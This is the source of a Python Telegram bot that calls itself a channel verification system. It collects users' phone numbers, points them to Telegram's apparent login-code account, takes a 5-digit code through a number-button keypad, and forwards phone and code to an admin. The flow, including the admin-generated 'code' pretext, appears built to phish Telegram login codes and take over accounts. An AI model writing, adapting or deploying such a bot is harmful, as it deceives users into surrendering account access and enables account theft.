import logging
import random
import asyncio
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ChatJoinRequestHandler, filters, ContextTypes
from telegram.error import BadRequest
import sqlite3
from datetime import datetime, timedelta

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration - Get from Railway environment variables
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', '5521402866'))
CHANNEL_ID = os.getenv('CHANNEL_ID', '-1002565132160')

class VerificationBot:
    def __init__(self):
        self.init_database()
        self.verification_sessions = {}  # Store active verification sessions
        
    def init_database(self):
        """Initialize SQLite database"""
        self.conn = sqlite3.connect('verification.db', check_same_thread=False)
        cursor = self.conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS pending_verifications (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                phone_number TEXT,
                verification_code TEXT,
                entered_code TEXT,
                timestamp DATETIME,
                code_entered_time DATETIME,
                status TEXT DEFAULT 'pending',
                admin_notified BOOLEAN DEFAULT 0
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS verified_users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                phone_number TEXT,
                verified_date DATETIME
            )
        ''')
        
        self.conn.commit()

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start command handler - Now includes contact sharing"""
        user = update.message.from_user
        
        welcome_text = f"""
🤖 **Channel Verification System**

Hello {user.first_name}! Welcome to our automated verification system.

**How it works:**
1. Share your contact number that you use for your Telegram account
2. You'll receive a 5-digit verification code
3. Enter the code using the number buttons
4. System will automatically verify your code
5. Once verified, you can join the channel!

**Step 1:** Please share your contact number by clicking the button below.

👇 Click the button to share your contact info.
        """
        
        # Create contact sharing button
        contact_keyboard = ReplyKeyboardMarkup([
            [KeyboardButton("📱 Share My Contact", request_contact=True)]
        ], resize_keyboard=True, one_time_keyboard=True)
        
        await update.message.reply_text(
            welcome_text, 
            parse_mode='Markdown',
            reply_markup=contact_keyboard
        )
        
        # Store pending verification
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO pending_verifications 
            (user_id, username, first_name, timestamp, status)
            VALUES (?, ?, ?, ?, ?)
        ''', (user.id, user.username, user.first_name, datetime.now(), 'awaiting_contact'))
        self.conn.commit()

    async def handle_join_request(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle new join requests to the channel"""
        try:
            user = update.chat_join_request.from_user
            chat = update.chat_join_request.chat
            
            # Log the join request
            logger.info(f"New join request from {user.first_name} (@{user.username}) to {chat.title}")
            
            # Check if user is already verified
            cursor = self.conn.cursor()
            cursor.execute('SELECT * FROM verified_users WHERE user_id = ?', (user.id,))
            if cursor.fetchone():
                # User is already verified, approve immediately
                await context.bot.approve_chat_join_request(chat.id, user.id)
                await context.bot.send_message(
                    user.id,
                    "✅ **Welcome back!**\n\nYou're already verified. Your join request has been approved! 🎉",
                    parse_mode='Markdown'
                )
                return
            
            # Notify admin about the join request
            admin_message = f"""
🔔 **New Join Request**

👤 **User:** {user.first_name} (@{user.username})
🆔 **User ID:** `{user.id}`
📢 **Channel:** {chat.title}
⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

User needs to complete verification process first.
            """
            await context.bot.send_message(ADMIN_ID, admin_message, parse_mode='Markdown')
            
            # Send verification message to user
            verification_message = f"""
🔐 **Verification Required**

Hello {user.first_name}! 

I noticed you requested to join **{chat.title}**. To get approved, please complete our automated verification process.

Please click /start to begin verification.
            """
            
            await context.bot.send_message(user.id, verification_message, parse_mode='Markdown')
            
        except Exception as e:
            logger.error(f"Error handling join request: {e}")
            await context.bot.send_message(ADMIN_ID, f"❌ Error handling join request: {e}")

    async def handle_contact(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle contact sharing"""
        try:
            user = update.message.from_user
            contact = update.message.contact
            
            # Verify it's the user's own contact
            if contact.user_id != user.id:
                await update.message.reply_text(
                    "❌ You need to share your own contact info, not someone else's.",
                    reply_markup=ReplyKeyboardRemove()
                )
                return
            
            # Update database with phone number
            cursor = self.conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO pending_verifications 
                (user_id, username, first_name, phone_number, timestamp, status)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (user.id, user.username, user.first_name, contact.phone_number, datetime.now(), 'contact_shared'))
            self.conn.commit()
            
            # Create button to get verification code
            code_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔑 Get Your Code Here", url="https://t.me/+42777")]
            ])
            
            # Send confirmation to user with button
            await update.message.reply_text(
                f"""
✅ **Contact Received!**

📱 **Phone:** {contact.phone_number}

⏳ **Next Step:** Get your verification code by clicking the button below:

**Important:** Don't close this chat. You'll need to enter the verification code here after you receive it.

**Note:** Click the button below to get your 5-digit verification code.
                """,
                parse_mode='Markdown',
                reply_markup=code_keyboard
            )
            
            # Remove the reply keyboard
            await update.message.reply_text(
                "Click the button above to get your verification code.",
                reply_markup=ReplyKeyboardRemove()
            )
            
            # Send detailed notification to admin with action buttons
            admin_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(f"🔢 Setup Code for {user.first_name}", callback_data=f"setup_code_{user.id}")],
                [InlineKeyboardButton("📋 View Pending Users", callback_data="view_pending")]
            ])
            
            admin_notification = f"""
📱 **Contact Info Received - Action Required**

👤 **User:** {user.first_name} (@{user.username})
🆔 **User ID:** `{user.id}`
📞 **Phone:** `{contact.phone_number}`
⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

**Next Action:** Setup verification code for this user.

**Instructions:**
1. Click the "Setup Code" button below
2. I'll generate a 5-digit code and enable code input for the user
3. **You need to send this code to the user separately** (SMS, call, etc.)
4. User will be able to enter the code here
5. You'll see what code they entered and can approve/reject

**Note:** The bot will NOT send the code to the user. You must send it via SMS or other method.
            """
            
            await context.bot.send_message(
                ADMIN_ID, 
                admin_notification, 
                parse_mode='Markdown',
                reply_markup=admin_keyboard
            )
            
        except Exception as e:
            logger.error(f"Error handling contact: {e}")
            await update.message.reply_text("❌ Error processing contact. Please try again.")

    async def handle_admin_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle admin callback buttons"""
        query = update.callback_query
        
        # Only admin can use these buttons
        if query.from_user.id != ADMIN_ID:
            await query.answer("❌ Admin only function")
            return
            
        await query.answer()
        
        if query.data.startswith('setup_code_'):
            user_id = int(query.data.split('_')[2])
            
            # Generate 5-digit verification code
            verification_code = str(random.randint(10000, 99999))
            
            # Update database with code
            cursor = self.conn.cursor()
            cursor.execute('''
                UPDATE pending_verifications 
                SET verification_code = ?, status = 'code_ready'
                WHERE user_id = ?
            ''', (verification_code, user_id))
            self.conn.commit()
            
            # Get user info
            cursor.execute('''
                SELECT first_name, username, phone_number 
                FROM pending_verifications 
                WHERE user_id = ?
            ''', (user_id,))
            user_info = cursor.fetchone()
            
            if user_info:
                first_name, username, phone_number = user_info
                
                # Send code input interface to user (but don't send the actual code)
                await self.send_code_input_interface(context, user_id, verification_code)
                
                # Show the generated code to admin ONLY
                await query.edit_message_text(
                    f"""
🔢 **Code Generated - SEND THIS TO USER**

👤 **User:** {first_name} (@{username})
📞 **Phone:** `{phone_number}`
🔢 **Generated Code:** `{verification_code}`

**IMPORTANT:** 
⚠️ **YOU MUST SEND THIS CODE TO THE USER via SMS or phone call**
⚠️ **The bot will NOT send this code automatically**

**Steps:**
1. Send the code `{verification_code}` to phone number `{phone_number}`
2. User can now enter the code using the interface I just sent them
3. You'll be notified when they enter their code for approval

**Next:** Send code `{verification_code}` to `{phone_number}` now.
                    """,
                    parse_mode='Markdown'
                )
            else:
                await query.edit_message_text("❌ User not found in pending verifications.")
                
        elif query.data == 'view_pending':
            await self.show_pending_users(query, context)
            
        elif query.data.startswith('approve_user_'):
            user_id = int(query.data.split('_')[2])
            await self.admin_approve_user(query, context, user_id, True)
            
        elif query.data.startswith('reject_user_'):
            user_id = int(query.data.split('_')[2])
            await self.admin_approve_user(query, context, user_id, False)

    async def admin_approve_user(self, query, context, user_id, approved):
        """Admin approves or rejects user verification"""
        try:
            cursor = self.conn.cursor()
            cursor.execute('''
                SELECT first_name, username, phone_number, verification_code, entered_code
                FROM pending_verifications 
                WHERE user_id = ?
            ''', (user_id,))
            
            user_info = cursor.fetchone()
            if not user_info:
                await query.edit_message_text("❌ User not found.")
                return
                
            first_name, username, phone_number, correct_code, entered_code = user_info
            
            if approved:
                # Add to verified users
                cursor.execute('''
                    INSERT OR REPLACE INTO verified_users 
                    (user_id, username, first_name, phone_number, verified_date)
                    VALUES (?, ?, ?, ?, ?)
                ''', (user_id, username, first_name, phone_number, datetime.now()))
                
                # Update pending verification status
                cursor.execute('''
                    UPDATE pending_verifications 
                    SET status = 'verified'
                    WHERE user_id = ?
                ''', (user_id,))
                
                self.conn.commit()
                
                # Try to approve join request if exists
                try:
                    await context.bot.approve_chat_join_request(CHANNEL_ID, user_id)
                    status_text = "✅ **Verification Complete!**\n\nCongratulations! Your verification has been processed successfully and your channel request has been approved. Welcome! 🎉"
                except BadRequest as e:
                    logger.error(f"Error approving join request: {e}")
                    status_text = f"""
✅ **Verification Complete!**

Your verification has been processed successfully! 

**Next Step:** Now you can try to join the channel. If you haven't requested to join yet, please do so now.

**Channel ID:** `{CHANNEL_ID}`

If you still can't join, please contact support.
                    """
                
                # Notify user of approval
                await context.bot.send_message(user_id, status_text, parse_mode='Markdown')
                
                # Update admin message
                await query.edit_message_text(
                    f"""
✅ **User Verification APPROVED**

👤 **User:** {first_name} (@{username})
📱 **Phone:** {phone_number}
🔢 **Sent Code:** `{correct_code}`
🔢 **User Entered:** `{entered_code}`
⏰ **Approved:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

✅ **Status:** User has been verified and approved for channel access.
                    """,
                    parse_mode='Markdown'
                )
                
            else:
                # Rejection
                cursor.execute('''
                    UPDATE pending_verifications 
                    SET status = 'rejected'
                    WHERE user_id = ?
                ''', (user_id,))
                self.conn.commit()
                
                # Notify user of rejection
                rejection_text = f"""
❌ **Verification Failed**

Unfortunately, your verification could not be completed.

**Reason:** The code you entered did not match our records.

**What you entered:** `{entered_code}`

If you believe this is an error, please try the verification process again by sending /start.
                """
                
                await context.bot.send_message(user_id, rejection_text, parse_mode='Markdown')
                
                # Update admin message
                await query.edit_message_text(
                    f"""
❌ **User Verification REJECTED**

👤 **User:** {first_name} (@{username})
📱 **Phone:** {phone_number}
🔢 **Sent Code:** `{correct_code}`
🔢 **User Entered:** `{entered_code}`
⏰ **Rejected:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

❌ **Status:** User verification has been rejected.
                    """,
                    parse_mode='Markdown'
                )
            
            # Clean up session if exists
            if user_id in self.verification_sessions:
                del self.verification_sessions[user_id]
                
        except Exception as e:
            logger.error(f"Error in admin approval: {e}")
            await query.edit_message_text("❌ Error processing approval. Please try again.")

    async def show_pending_users(self, query, context):
        """Show pending verification users to admin"""
        cursor = self.conn.cursor()
        cursor.execute('''
            SELECT user_id, first_name, username, phone_number, timestamp, status, entered_code, verification_code
            FROM pending_verifications 
            WHERE status IN ('contact_shared', 'awaiting_contact', 'code_ready', 'code_entered')
            ORDER BY timestamp DESC
        ''')
        
        pending = cursor.fetchall()
        
        if not pending:
            await query.edit_message_text("📋 No pending verifications at the moment.")
            return
            
        message = "📋 **Pending Verifications:**\n\n"
        
        for user in pending:
            user_id, first_name, username, phone, timestamp, status, entered_code, verification_code = user
            status_emoji = {
                'awaiting_contact': '⏳',
                'contact_shared': '📱',
                'code_ready': '🔢',
                'code_entered': '✏️'
            }
            
            message += f"{status_emoji.get(status, '❓')} **{first_name}** (@{username})\n"
            message += f"   📞 `{phone or 'No contact yet'}`\n"
            message += f"   🕐 {timestamp}\n"
            message += f"   📊 Status: {status}\n"
            
            if verification_code and status == 'code_ready':
                message += f"   🔢 Code to send: `{verification_code}`\n"
            elif entered_code and verification_code:
                message += f"   🔢 Generated: `{verification_code}` | Entered: `{entered_code}`\n"
                
            message += "\n"
            
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Refresh", callback_data="view_pending")]
        ])
        
        await query.edit_message_text(message, parse_mode='Markdown', reply_markup=keyboard)

    async def send_code_input_interface(self, context, user_id, verification_code):
        """Send numeric input interface to user"""
        try:
            # Create numeric keyboard
            keyboard = []
            numbers = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
            
            # Create 3x3 + 1 layout
            for i in range(0, 9, 3):
                row = [InlineKeyboardButton(num, callback_data=f"num_{num}_{user_id}") for num in numbers[i:i+3]]
                keyboard.append(row)
            keyboard.append([InlineKeyboardButton('0', callback_data=f'num_0_{user_id}')])
            
            # Add control buttons
            keyboard.append([
                InlineKeyboardButton('🔙 Backspace', callback_data=f'backspace_{user_id}'),
                InlineKeyboardButton('✅ Submit', callback_data=f'submit_code_{user_id}')
            ])
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            message = f"""
🔢 **Enter Verification Code**

Please enter the 5-digit verification code you received using the number buttons below.

**Instructions:**
1. Use the number buttons to enter your 5-digit code
2. Click "Backspace" to remove the last digit if needed
3. Click "Submit" when you've entered all 5 digits
4. System will automatically verify your code

**Code Input:** ○○○○○

Entered: 0/5 digits

**Note:** Make sure you get your code from the button above.
            """
            
            await context.bot.send_message(
                user_id,
                message,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
            
            # Initialize verification session
            self.verification_sessions[user_id] = {
                'entered_code': '',
                'correct_code': verification_code
            }
            
        except Exception as e:
            logger.error(f"Error sending code interface: {e}")

    async def handle_user_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle user inline keyboard callbacks"""
        try:
            query = update.callback_query
            user_id = query.from_user.id
            data = query.data
            
            await query.answer()
            
            # Extract user_id from callback data
            if not data.endswith(f'_{user_id}'):
                await query.edit_message_text("❌ Session error. Please start verification again.")
                return
                
            if user_id not in self.verification_sessions:
                await query.edit_message_text("❌ Session expired. Please contact support to resend code.")
                return
            
            session = self.verification_sessions[user_id]
            
            if data.startswith(f'num_'):
                # Add number to entered code
                number = data.split('_')[1]
                if len(session['entered_code']) < 5:
                    session['entered_code'] += number
                    
                # Update display
                display_code = '●' * len(session['entered_code']) + '○' * (5 - len(session['entered_code']))
                await query.edit_message_text(
                    f"""
🔢 **Enter Verification Code**

**Code Input:** {display_code}

Entered: {len(session['entered_code'])}/5 digits

Please enter the verification code you received.
System will automatically verify your code after submission.

**Note:** Make sure you get your code from the button provided earlier.
                    """,
                    parse_mode='Markdown',
                    reply_markup=query.message.reply_markup
                )
                
            elif data.startswith(f'backspace_'):
                # Remove last entered digit
                if session['entered_code']:
                    session['entered_code'] = session['entered_code'][:-1]
                    
                display_code = '●' * len(session['entered_code']) + '○' * (5 - len(session['entered_code']))
                await query.edit_message_text(
                    f"""
🔢 **Enter Verification Code**

**Code Input:** {display_code}

Entered: {len(session['entered_code'])}/5 digits

Please enter the verification code you received.
System will automatically verify your code after submission.

**Note:** Make sure you get your code from the button provided earlier.
                    """,
                    parse_mode='Markdown',
                    reply_markup=query.message.reply_markup
                )
                
            elif data.startswith(f'submit_code_'):
                # Submit the entered code for verification
                if len(session['entered_code']) != 5:
                    await query.edit_message_text(
                        "❌ **Incomplete Code**\n\nPlease enter all 5 digits before submitting.",
                        parse_mode='Markdown',
                        reply_markup=query.message.reply_markup
                    )
                    return
                
                # Save entered code to database
                cursor = self.conn.cursor()
                cursor.execute('''
                    UPDATE pending_verifications 
                    SET entered_code = ?, code_entered_time = ?, status = 'code_entered'
                    WHERE user_id = ?
                ''', (session['entered_code'], datetime.now(), user_id))
                self.conn.commit()
                
                # Notify user that code is being processed
                await query.edit_message_text(
                    f"""
✅ **Code Submitted**

Your verification code is being processed by our system.

**Code Entered:** `{session['entered_code']}`
**Status:** Processing verification

⏳ Please wait for the system to verify your code.

**Note:** This process is usually completed within a few minutes.
                    """,
                    parse_mode='Markdown'
                )
                
                # Get user info for admin notification
                cursor.execute('''
                    SELECT first_name, username, phone_number, verification_code
                    FROM pending_verifications 
                    WHERE user_id = ?
                ''', (user_id,))
                
                user_info = cursor.fetchone()
                if user_info:
                    first_name, username, phone_number, correct_code = user_info
                    
                    # Create admin approval buttons
                    admin_keyboard = InlineKeyboardMarkup([
                        [
                            InlineKeyboardButton("✅ Approve", callback_data=f"approve_user_{user_id}"),
                            InlineKeyboardButton("❌ Reject", callback_data=f"reject_user_{user_id}")
                        ],
                        [InlineKeyboardButton("📋 View All Pending", callback_data="view_pending")]
                    ])
                    
                    # Send admin notification
                    admin_message = f"""
🔍 **CODE REVIEW REQUIRED**

👤 **User:** {first_name} (@{username})
🆔 **User ID:** `{user_id}`
📱 **Phone:** {phone_number}
⏰ **Submitted:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔢 **Generated Code:** `{correct_code}`
🔢 **User Entered:** `{session['entered_code']}`

**Match Status:** {'✅ CORRECT' if session['entered_code'] == correct_code else '❌ INCORRECT'}

**Action Required:** Please review and approve or reject this verification.
                    """
                    
                    await context.bot.send_message(
                        ADMIN_ID,
                        admin_message,
                        parse_mode='Markdown',
                        reply_markup=admin_keyboard
                    )
                    
        except Exception as e:
            logger.error(f"Error handling user callback: {e}")
            await query.edit_message_text("❌ An error occurred. Please contact support.")

    async def admin_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show admin statistics"""
        if update.message.from_user.id != ADMIN_ID:
            return
            
        cursor = self.conn.cursor()
        
        # Get stats
        cursor.execute('SELECT COUNT(*) FROM verified_users')
        verified_count = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM pending_verifications WHERE status NOT IN ("verified", "rejected")')
        pending_count = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM pending_verifications WHERE status = "code_entered"')
        awaiting_approval = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM pending_verifications WHERE status = "verified"')
        total_verified = cursor.fetchone()[0]
        
        stats_message = f"""
📊 **Bot Statistics**

✅ **Verified Users:** {verified_count}
⏳ **Pending Verifications:** {pending_count}
🔍 **Awaiting Approval:** {awaiting_approval}
📈 **Total Processed:** {total_verified}

**Recent Verifications:**
        """
        
        # Get recent verifications
        cursor.execute('''
            SELECT first_name, username, verified_date 
            FROM verified_users 
            ORDER BY verified_date DESC 
            LIMIT 5
        ''')
        
        recent = cursor.fetchall()
        for user in recent:
            stats_message += f"\n• {user[0]} (@{user[1]}) - {user[2]}"
            
        # Add action buttons
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📋 View Pending Users", callback_data="view_pending")],
            [InlineKeyboardButton("🔍 View Users Awaiting Approval", callback_data="view_awaiting")]
        ])
            
        await update.message.reply_text(stats_message, parse_mode='Markdown', reply_markup=keyboard)

def main():
    """Main function to run the bot"""
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN environment variable not set!")
        return
        
    # Initialize bot
    bot = VerificationBot()
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CommandHandler("stats", bot.admin_stats))
    application.add_handler(ChatJoinRequestHandler(bot.handle_join_request))
    application.add_handler(MessageHandler(filters.CONTACT, bot.handle_contact))
    
    # Separate callback handlers for admin and users
    application.add_handler(CallbackQueryHandler(bot.handle_admin_callback, pattern=r'^(setup_code_|view_pending|approve_user_|reject_user_)'))
    application.add_handler(CallbackQueryHandler(bot.handle_user_callback, pattern=r'^(num_|backspace_|submit_code_)'))
    
    # Start the bot
    logger.info("Starting bot...")
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
